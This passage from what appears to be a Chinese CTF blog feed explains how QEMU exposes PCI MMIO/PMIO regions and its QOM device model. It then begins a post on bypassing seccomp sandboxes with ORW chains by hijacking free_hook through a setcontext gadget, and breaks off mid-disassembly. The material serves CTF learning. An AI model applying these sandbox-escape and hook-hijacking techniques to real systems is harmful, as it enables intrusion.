class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 local_cpus</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 modalias</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 14:18 msi_bus</span><br><span class="line">drwxr-xr-x  2 root root    0 Jun  7 14:18 power</span><br><span class="line">--w--w----  1 root root 4096 Jun  7 14:18 remove</span><br><span class="line">--w--w----  1 root root 4096 Jun  7 14:18 rescan</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 resource</span><br><span class="line">-rw-------  1 root root  256 Jun  7 14:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Jun  7 14:18 resource1</span><br><span class="line">lrwxrwxrwx  1 root root    0 Jun  7 14:18 subsystem -&gt; ../../../bus/pci</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 subsystem_device</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 14:18 subsystem_vendor</span><br><span class="line">-rw-r--r--  1 root root 4096 Jun  7 13:00 uevent</span><br><span class="line">-r--r--r--  1 root root 4096 Jun  7 13:58 vendor</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其他相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识为（flags）。</p><h1 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I/O空间"></a>qemu中访问I/O空间</h1><p>存在mmio与pmio，那么在系统中该如何访问这两个空间呢？访问mmio与pmio都可以采用在内核态访问或者在用户空间编程进行访问。</p><h2 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h2><p>编译内核模块，在内核态访问mmio空间，实例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><p>另一种就是常用的在用户态访问mmio空间，通过映射<code>resource0</code>文件实现内存的访问，实例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">        mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h2><p>编译内核模块，在内核空间访问pmio空间，示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure><p>用户空间访问则需要先调用<code>iopl</code>函数申请访问端口，示例代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure><h1 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h1><p>qemu提供了一套面向对象编程的模型–QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其他面向对象语言来理解QOM。</p><p>有几个比较关键的结构体：<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p><p><code>TypeInfo</code>是用户用来定义一个<code>Type</code>的数据结构，用于定义了一个<code>TypeInfo</code>，然后调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就会生成相应的<code>TypeImpl</code>实例，将这个<code>TypeInfo</code>注册到全局TypeImpl的<code>hash</code>表中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent;</span><br><span class="line">    <span class="keyword">size_t</span> instance_size;</span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="keyword">bool</span> abstract;</span><br><span class="line">    <span class="keyword">size_t</span> class_size;</span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> *class_data;</span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">size_t</span> class_size;  <span class="comment">/*该数据类型所代表的类的大小*/</span></span><br><span class="line">    <span class="keyword">size_t</span> instance_size;  <span class="comment">/*该数据类型产生的对象的大小*/</span></span><br><span class="line">    <span class="comment">/*类的 Constructor &amp; Destructor*/</span></span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> *class_data;</span><br><span class="line">    <span class="comment">/*实例的Contructor &amp; Destructor*/</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="keyword">bool</span> abstract;  <span class="comment">/*表示类是否是抽象类*/</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent;  <span class="comment">/*父类的名字*/</span></span><br><span class="line">    TypeImpl *parent_type;  <span class="comment">/*指向父类TypeImpl的指针*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span>  <span class="comment">/*该类型对应的类的指针*/</span></span><br><span class="line">    <span class="keyword">int</span> num_interfaces;  <span class="comment">/*所实现的接口的数量*/</span></span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//其中InterfaceImpl的定义如下，只是一个类型的名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InterfaceImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">typename</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TypeImpl</code>的属性与<code>TypeInfo</code>的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl对象。</p><p>如下面定义的<code>pci_test_dev</code>:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);<span class="comment">//TypeInfo实例化成TypeImpl</span></span><br><span class="line">    type_table_add(ti);<span class="comment">//加入到TypeImpl中的hash表中</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有qemu总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中取实例化其对应的<code>ObjectClass</code>。</p><p>每个<code>Type</code>都有一个相应的<code>ObjectClass</code>所对应，其中<code>ObjectClass</code>是所有类的基类</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用户可以定义自己的类，继承相应类即可：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类的初始化会先初始化它的父类，父类初始化完成后，会将相应字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值，同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，<code>TypeInfo::class_init</code>就会调用以实现虚函数的初始化，如下例的<code>pci_testdev_class_init</code>所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;<span class="built_in">exit</span> = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一个是<code>Object</code>对象：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Object</code>对象为何物？<code>Type</code>以及<code>ObjectClass</code>只是一个类型，而不是具体的设备。<code>TypeInfo</code>结构体中有两个函数指针：<code>instance_init</code>以及<code>class_init</code>。<code>class_init</code>是负责初始化<code>ObjectClass</code>结构体的，<code>instance_init</code>则是负责初始化具体<code>Object</code>结构体的。</p><blockquote><p>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device’s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine).<br>Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。</p></blockquote><p><code>Object</code>示例如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> <span class="title">Object</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass *<span class="class"><span class="keyword">class</span>;</span> <span class="comment">/* points to the Type&#x27;s ObjectClass instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/qemu/typedefs.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> <span class="title">DeviceState</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> <span class="title">PCIDevice</span>;</span></span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Object parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">        DeviceState qdev;</span><br><span class="line">        ...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">YourDeviceState</span>&#123;</span></span><br><span class="line">        PCIDevice pdev;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>QOM会为设备Object分配<code>instace_size</code>大小的空间，然后调用<code>instance_init</code>函数（在Objectclass的class_init函数中定义）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>最后便是PCI的内存空间了，qemu使用<code>MemoryRegion</code>来表示内存空间，在<code>include/exec/memory.h</code>中定义。使用<code>MemoryRegionOps</code>结构体来对内存的操作进行表示，如<code>PMIO</code>或<code>MMIO</code>。对每个<code>PMIO</code>或<code>MMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，该结构体包含相应的<code>read/write</code>回调函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_pio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_pio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先使用<code>memory_region_init_io</code>函数初始化内存空间（<code>MemoryRegion</code>结构体），记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。需要指出的是无论是MMIO还是PMIO，其所对应的空间需要显示的指出（即静态声明或者是动态分配），因为<code>memory_region_init_io</code>只是记录空间大小而并不分配。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-mmio&quot;</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-portio&quot;</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure><p>可以在下面的链接中看看一个设备具体怎么实现的</p><p><a href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qemu概述&quot;&gt;&lt;a href=&quot;#qemu概述&quot; class=&quot;headerlink&quot; title=&quot;qemu概述&quot;&gt;&lt;/a&gt;qemu概述&lt;/h1&gt;&lt;p&gt;运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>论ORW的多种利用姿势</title>
    <link href="https://billyotry.github.io/2021/05/29/%E8%AE%BAORW%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://billyotry.github.io/2021/05/29/%E8%AE%BAORW%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/</id>
    <published>2021-05-29T13:47:40.255Z</published>
    <updated>2021-06-03T13:25:37.319Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为ctf太卷了，现在比赛基本都会遇到沙盒，没办法，只能学一学，总结一下</p><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>一般我们使用如下指令来查看沙箱</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./main</span><br></pre></td></tr></table></figure><p><code>system</code>函数是借用<code>execve</code>函数实现了，一般都是禁用了<code>execve</code>函数，所以<code>system</code>也没法用，所以一般的解法就是<strong>ORW</strong></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>在<code>Glibc2.29</code>以前的 ORW 解题思路已经比较清晰，主要是劫持<code>free_hook</code>或者<code>malloc_hook</code>写入<code>setcontext</code>函数中的<code>gadget</code>，通过<code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 ORW ROP chains</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    